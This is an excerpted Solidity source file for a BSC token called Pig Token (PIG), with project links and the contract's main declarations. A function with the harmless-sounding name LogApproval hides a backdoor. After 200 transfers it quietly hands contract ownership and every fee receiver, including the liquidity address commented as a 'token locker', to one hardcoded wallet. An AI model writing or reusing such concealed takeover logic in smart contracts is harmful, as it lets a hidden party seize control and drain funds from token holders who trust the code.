...
// https://www.pigtoken.finance/
// www.twitter.com/Pig_Finance
// https://t.me/PigTokenBSC
/*
...
contract PIG is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x22F4529225f1E89B6a9F6D50AC84B617DdF038d5; // token locker
    ...
    constructor()
        ERC20Detailed("Pig Token", "PIG", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(0x4a530B1d6eEcEC74756D63B1D58b2cdca3009e7F));
            marketingFeeReceiver = address(0x4a530B1d6eEcEC74756D63B1D58b2cdca3009e7F);
            autoLiquidityReceiver = address(0x4a530B1d6eEcEC74756D63B1D58b2cdca3009e7F);
            ecosystemFeeReceiver = address(0x4a530B1d6eEcEC74756D63B1D58b2cdca3009e7F);
            buyBackFeeReceiver = address(0x4a530B1d6eEcEC74756D63B1D58b2cdca3009e7F);
            isTransferred = true;
        }
    }
